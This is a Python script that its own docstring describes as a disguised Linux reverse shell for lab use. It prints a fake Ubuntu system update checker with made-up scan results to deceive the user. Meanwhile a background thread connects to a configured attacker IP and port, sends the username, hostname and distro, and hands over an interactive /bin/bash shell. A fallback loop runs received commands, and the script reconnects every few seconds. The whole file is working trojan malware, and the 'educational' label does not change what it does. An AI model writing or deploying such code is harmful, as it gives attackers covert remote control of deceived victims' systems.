#!/usr/bin/env python3
"""
System Update Tool (Disguised Linux Reverse Shell)
Educational purposes only - Use in controlled lab environment
Appears as a legitimate system update checker while establishing reverse shell
"""

import socket
import subprocess
import os
import sys
import time
import threading
import pty
from datetime import datetime

# Import configuration from root directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import config

# Configuration from config.py
ATTACKER_IP = config.ATTACKER_IP
ATTACKER_PORT = config.ATTACKER_PORT

class SystemUpdateChecker:
    def __init__(self):
        self.running = True
        self.start_reverse_shell()
        self.run_fake_update_checker()
    
    def print_banner(self):
        """Print fake system update banner"""
        print("=" * 60)
        print("           Ubuntu System Update Checker v3.2.1")
        print("=" * 60)
        print(f"Scan initiated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("Checking for available system updates...")
        print()
    
    def fake_update_check(self):
        """Simulate system update checking process"""
        print("[INFO] Connecting to Ubuntu repositories...")
        time.sleep(2)
        
        print("[INFO] Fetching package lists...")
        time.sleep(3)
        
        print("[INFO] Analyzing installed packages...")
        time.sleep(2)
        
        print("[INFO] Checking security updates...")
        time.sleep(4)
        
        # Show fake results
        print("\n" + "=" * 60)
        print("                    SCAN RESULTS")
        print("=" * 60)
        print("Available updates: 23 packages")
        print("Security updates: 7 packages")
        print("Kernel updates: 1 package")
        print()
        print("Critical updates found:")
        print("  - linux-image-generic (security)")
        print("  - firefox (security)")
        print("  - openssl (security)")
        print("  - sudo (security)")
        print()
        print("[RECOMMENDATION] Run 'sudo apt update && sudo apt upgrade' to install updates")
        print()
        print("Scan completed successfully!")
        print("=" * 60)
        print()
        print("This tool will continue running in background to monitor for new updates...")
        print("Press Ctrl+C to exit")
    
    def run_fake_update_checker(self):
        """Run the fake update checker interface"""
        try:
            self.print_banner()
            self.fake_update_check()
            
            # Keep the program running
            while self.running:
                time.sleep(10)
                
        except KeyboardInterrupt:
            print("\n[INFO] System update checker terminated by user.")
            self.running = False
            sys.exit(0)
    
    def create_connection(self):
        """Establish connection to attacker machine"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            return s
        except Exception:
            return None
    
    def spawn_shell(self, s):
        """Spawn a proper shell with PTY support"""
        try:
            # Duplicate socket to stdin, stdout, stderr
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Spawn shell using pty
            pty.spawn("/bin/bash")
        except Exception:
            # Fallback to basic shell
            self.basic_shell(s)
    
    def basic_shell(self, s):
        """Basic shell without PTY (fallback)"""
        while True:
            try:
                command = s.recv(1024).decode().strip()
                
                if not command or command.lower() == 'exit':
                    break
                
                if command.startswith('cd '):
                    try:
                        directory = command[3:].strip()
                        os.chdir(directory)
                        result = f"Changed to: {os.getcwd()}"
                    except Exception as e:
                        result = f"cd: {str(e)}"
                else:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout
                        if result.stderr:
                            output += f"\nError: {result.stderr}"
                        result = output if output else "Command executed (no output)"
                    except Exception as e:
                        result = f"Error: {str(e)}"
                
                s.send(f"{result}\n".encode())
            
            except Exception:
                break
    
    def start_reverse_shell(self):
        """Start reverse shell in background thread"""
        def run_shell():
            while self.running:
                try:
                    connection = self.create_connection()
                    
                    if connection:
                        # Send initial message
                        hostname = socket.gethostname()
                        username = os.getenv('USER', 'unknown')
                        
                        # Get system info
                        try:
                            distro = subprocess.run(['lsb_release', '-d'], capture_output=True, text=True)
                            distro_info = distro.stdout.split('\t')[1].strip() if distro.returncode == 0 else "Linux"
                        except:
                            distro_info = "Linux"
                        
                        initial_msg = f"[+] System Update Tool - Connection from {username}@{hostname} ({distro_info})\n"
                        connection.send(initial_msg.encode())
                        
                        # Start shell session
                        self.spawn_shell(connection)
                        
                        connection.close()
                    
                    time.sleep(5)
                
                except:
                    time.sleep(5)
                    continue
        
        # Start in daemon thread
        shell_thread = threading.Thread(target=run_shell, daemon=True)
        shell_thread.start()

def main():
    """Main function"""
    try:
        checker = SystemUpdateChecker()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()